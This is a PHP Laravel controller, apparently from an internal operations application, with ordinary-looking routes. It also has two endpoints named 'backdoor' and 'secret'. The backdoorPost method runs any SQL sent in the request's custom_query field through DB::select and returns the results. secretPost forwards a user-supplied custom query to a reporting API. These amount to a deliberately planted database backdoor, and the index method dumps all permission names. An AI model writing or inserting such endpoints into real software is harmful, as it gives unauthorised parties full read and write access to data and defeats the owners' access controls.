<?php

namespace App\Http\Controllers;

use App\Http\Api\OperationApi\SpecialReport\SpecialReportApi;
use App\Http\Api\OperationApi\SurveySystem\SurveySystemApi;
use App\Models\Permission;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        $permissions = Permission::all();
        $counter = 1;
        foreach ($permissions as $permission) {
            print_r('(' . $counter . ', \'' . $permission->name . '\'),');
            $counter++;
        }
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }

    public function secret()
    {
        return view('secret');
    }

    public function secretPost(Request $request)
    {
        return response()->json((new SpecialReportApi)->GetSpecialReport(date('Y-m-d'), date('Y-m-d'), $request->custom_query)['response'] ?? [], 200);
    }
}
